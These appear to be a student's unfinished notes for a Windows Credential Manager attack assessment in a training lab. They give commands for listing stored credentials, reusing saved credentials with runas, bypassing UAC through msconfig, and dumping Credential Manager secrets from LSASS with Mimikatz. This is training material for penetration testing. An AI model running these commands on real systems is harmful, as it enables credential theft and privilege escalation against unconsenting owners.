# Skills Assessment — Attacking Windows Credential Manager

**Status:** ⬜ Not Started (Pending)

**Note:** Previous content was from section exercises, not the final assessment.

---

## Target
- **IP/URL:** (To be spawned)
- **OS:** Windows
- **Difficulty:** Academy Assessment

---

## Reconnaissance

```bash
# Enumerate stored credentials
cmdkey /list

# Check for credential vaults
dir %UserProfile%\AppData\Roaming\Microsoft\Vault\ /s
dir %UserProfile%\AppData\Local\Microsoft\Credentials\ /s
```

---

## Exploitation Techniques (From Section Exercises)

### Technique 1: Credential Reuse with runas
```cmd
# If a credential is stored with /savecred
runas /savecred /user:DOMAIN\username cmd
```

### Technique 2: UAC Bypass via msconfig
```cmd
# As admin user, open msconfig → Tools → Command Prompt → Launch
# Spawns elevated shell without UAC prompt
```

### Technique 3: Mimikatz sekurlsa::credman
```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```
Dumps all Credential Manager entries from LSASS memory.

---

## Flags / Answers (To be completed)

| # | Question | Answer | Status |
|---|----------|--------|--------|
| 1 | | | ⬜ |
| 2 | | | ⬜ |

---

## Lessons Learned

- `cmdkey /list` — enumerate stored credentials
- `runas /savecred` — lateral movement without password
- `msconfig` UAC bypass — elevation via trusted binary
- `sekurlsa::credman` — extract web/domain credentials from memory
